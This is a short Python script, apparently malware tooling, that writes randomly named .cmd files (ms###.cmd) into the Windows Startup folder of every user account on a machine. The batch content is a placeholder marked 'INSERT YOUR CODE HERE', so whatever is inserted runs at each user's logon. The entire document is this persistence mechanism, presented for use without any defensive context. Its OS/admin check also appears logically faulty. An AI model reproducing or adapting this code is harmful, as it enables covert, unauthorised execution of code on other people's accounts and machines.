import ctypes, os, sys
import random

def rand():
    return '\\ms' + str(random.randrange(100,999)) + '.cmd'


if os.name != 'nt' and ctypes.windll.shell32.IsUserAnAdmin() != 0:
    sys.exit()

INF_CODE = """
REM STARTUP CODE INJECTOR
REM INSERT YOUR CODE HERE
"""

ST_PATH = "C:\\Users\\{}\\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
users = os.listdir('C:\\Users')

ST_USERS = []

for usr in users:
    ST_USERS.append(usr) if os.path.exists(ST_PATH.format(usr)) else None

if len(ST_USERS) == 0 : sys.exit()

for usr in ST_USERS:
    with open(ST_PATH.format(usr) + rand(), 'w') as bat:
        bat.write(INF_CODE)
